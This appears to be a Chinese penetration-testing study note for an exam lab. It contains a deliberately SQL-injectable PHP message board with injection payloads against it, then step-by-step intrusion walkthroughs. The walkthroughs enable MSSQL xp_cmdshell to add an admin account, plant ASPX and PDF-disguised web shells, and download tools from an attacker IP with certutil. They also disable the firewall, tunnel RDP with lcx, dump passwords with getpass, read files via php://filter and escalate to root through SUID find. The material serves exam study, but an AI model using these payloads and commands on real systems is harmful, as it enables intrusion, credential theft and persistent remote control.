

# 留言板



```php+HTML
<?php

$servername = "localhost";
$username = "root";
$password = "root";
$dbname = "2web";

//创建连接
$con = new mysqli($servername,$username,$password,$dbname);

//连接检测
if($con->connect_error){
    die("连接错误".$con->connect_error);
}

//判断是否有get
if(isset($_GET['submit'])){
    $title = $_GET['title'];
    $content = $_GET['content'];
    $author = $_GET['author'];
    //防火墙
    $author = str_replace(" ","",$author);
    if(stristr($author,"updatexml")){
        die("no hacking");
    }
    if(stristr($author,"extractvalue")){
        die("no hacking");
    }
    
    $insert_sql = "INSERT INTO `article`(`title`,`content`,`author`,`nid`) VALUES('$title','$content','$author','123')";
    echo "执行语句为:".$insert_sql."<br/>";

    if($con->query($insert_sql)===TRUE){
        $message = "执行成功<br/>";
    }else{
        $message = "执行失败".$con->error."<br/>";
    }

}

//查询文章内容
$sql = "SELECT title,content,author FROM article";
//执行sql语句
$result = $con->query($sql);
//判断result里是否有数据
if($result->num_rows>0){
    //输出
    while($row=$result->fetch_assoc()){
        echo $row['title'].'------'.$row['content'].'----'.$row['author'].'<br/>';
    }
}

$con->close();

?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>留言板</title>
</head>
<body>

<form action="index.php" method="GET">
    标题:<input type="text" name="title" /><br/>
    内容:<input type="text" name="content" /><br/>
    作者名字:<input type="text" name="author" /><br/>
    <input type="submit" name="submit" value="submit"/><br/>
</form>
<div>
    <p><?php if($message){echo $message;} ?></p>
</div>
    
</body>
</html>
```

```sql

INSERT INTO `article`(`title`,`content`,`author`,`nid`) VALUES('$title','$content','  x  ','123')

x','123'),('x',database(),'3

x','123'),('x',(select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=0x32776562),'3

x','123'),('x',(updatexml(1,concat(0x7e,(select/**/database())),1)),'3


x','123'),('x',(select/**/1/**/from/**/(select/**/count(*),concat(0x3a,(database()),0x3a,floor(rand()*2))a/**/from/**/information_schema.tables/**/group/**/by/**/a)b),'3

x','123'),('x',(select/**/1/**/from/**/(select/**/count(*),concat(0x3a,(select/**/table_name/**/from/**/information_schema.tables/**/where/**/table_schema=0x32776562/**/limit/**/0,1),0x3a,floor(rand()*2))a/**/from/**/information_schema.tables/**/group/**/by/**/a)b),'3

```



小知识：
nmap/zenmap
标准化扫描器

target is

![img](file:///C:\Users\28633\AppData\Roaming\Tencent\QQTempSys\%W@GJ$ACOF(TYDYECOKVDYB.png)172.93.188.118

![img](file:///C:\Users\28633\AppData\Roaming\Tencent\QQTempSys\%W@GJ$ACOF(TYDYECOKVDYB.png)172.93.188.118:81
无法知道用户名密码

通过报错可以知道是Windows的服务器

使用zenmap端口扫描发现有web81端口，也有1433端口(SQL SERVER)  #MYSQL:3306

扫描目录 backup.rar
发现web.config，是Windows server的数据库配置文件

使用navicat连接到他的数据库

可以发现用户名和密码（如果密码使用md5加密，就自己制造）

登录进去，试试看文件上传可不可以用

如果web层面不行，就从数据库进行渗透

mssql提权命令

```sql
exec sp_configure 'show advanced options',1;
reconfigure;
exec sp_configure 'xp_cmdshell',1;
reconfigure;
exec sp_configure;
exec xp_cmdshell 'net user zj pa$$w0rd /add';
exec xp_cmdshell 'net localgroup administrators zj /add';
```

读取文件

```
exec xp_cmdshell 'type C:\Users\Administrator\Desktop\key.txt';
```

查看桌面信息

```
exec xp_cmdshell 'dir C:\Users\Administrator\Desktop\';
```

通过数据库添加一句话木马

```
exec xp_cmdshell 'echo ^<%@ Page Language="Jscript"%^>^<%eval(Request.Item["pass"],"unsafe");%^> > C:\\inetpub\\wwwroot\\a.aspx';
```

当用菜刀连接到Windows操作系统的时候，有可能key在回收站里！！！！！！！！！

让对方下载自己这边web服务器的文件

```
exec xp_cmdshell 'certutil -urlcache -f -split ![img](file:///C:\Users\28633\AppData\Roaming\Tencent\QQTempSys\%W@GJ$ACOF(TYDYECOKVDYB.png)http://192.168.1.149/3389.bat';
exec xp_cmdshell 'certutil -urlcache -f -split http://192.168.1.149/lcx.exe';
```

运行刚刚让他下载的东西

```
exec xp_cmdshell '3389.bat';
```

关闭防火墙

```
exec xp_cmdshell 'netsh firewall set opmode disable';
```

查看端口开放情况

```
exec xp_cmdshell 'netstat -an';
```

使用lcx的端口映射

```
exec xp_cmdshell 'lcx.exe -slave ![img](file:///C:\Users\28633\AppData\Roaming\Tencent\QQTempSys\%W@GJ$ACOF(TYDYECOKVDYB.png)192.168.1.149 2222 127.0.0.1 3389';
```

在自己这里执行

```
lcx.exe -listen 2222 3333
```

之后使用远程桌面（mstsc）连接127.0.0.1:3333就可以进行远程桌面连接了（前提是你已经上传了Getpass.exe）我们试验机的密码pa$$w0rd

\----------------

python变成http服务器

新版

```
python -m http.server 当前目录，并且8000端口
python -m http.server 9000 指定端口
```

旧版

```
python -m SimpleHTTPServer 8080
```

```
exec xp_cmdshell 'certutil -urlcache -f -split http://192.168.1.149/getpass.exe';
exec xp_cmdshell 'getpass.exe >> c:\\123.txt';
exec xp_cmdshell 'type c:\\123.txt';
```



------

192.168.70.149

访问网站
zenmap扫描ip（考场建议全端口扫描）

也可以用御剑扫描一下全站
发现phpinfo.php

发现ftp的21号端口，允许匿名anonymous

发现3306端口，是mysql

发现6721也是一个网站

80端口，测试什么语言写的时候
index.php是一个登录界面，index.html是一个糊弄的

测试一下21端口的ftp
ftp 目标ip
使用anonymous登录
发现pub文件夹
dir 发现有个config.php，get下来

在config.php中发现数据库信息

navicat连接

发现管理员信息，密码是md5的，自己md5一个123456
修改目标数据库的超级管理员密码

之后可以登录

有个文件上传，怎么测试都是失败，因为只能上传pdf结尾的文件
pdf无法被当作php解析

访问6721端口的站
/api/query_pdf.php
POST
archive=php://filter/read=convert.base64-encode/resource=query_pdf.php

访问主站ip/phpinfo.php
发现暴露了主站在Linux系统中的绝对路径
DOCUMENT_ROOT  /var/www/html/PIzABXDg/ 

也就是说主站的index.php
/var/www/html/PIzABXDg/index.php

/api/query_pdf.php
POST
archive=php://filter/read=convert.base64-encode/resource=/var/www/html/PIzABXDg/index.php

对index.php进行代码审计

通过代码审计，发现model/order_upload.php文件

/api/query_pdf.php
POST
archive=php://filter/read=convert.base64-encode/resource=/var/www/html/PIzABXDg/model/order_upload.php

对order_upload.php进行代码审计
发现上传位置为CISP-PTE-1413/
并且文件上传必须为pdf，无法绕过

打开蚁剑
使用自带的一句话木马，改成pdf，进行上传
发现上传位置在
目标ip/CISP-PTE-1413/zj.pdf

蚁剑连接方式
目标ip:6721/api/query_pdf.php
密码ant
编码器base64
请求信息的http body
name是archive
//

连接发现key7在
/var/www/html/PIzABXDg/key7.php

开始提权
看看哪些可以使用root权限运行
find / -perm -u=s -type f 2>/dev/null
发现很多东西
/bin/find，考场有可能是/usr/bin/find

/bin/find query_pdf.php -exec whoami \;
发现是root权限

/bin/find query_pdf.php -exec cat /root/key8.php \;
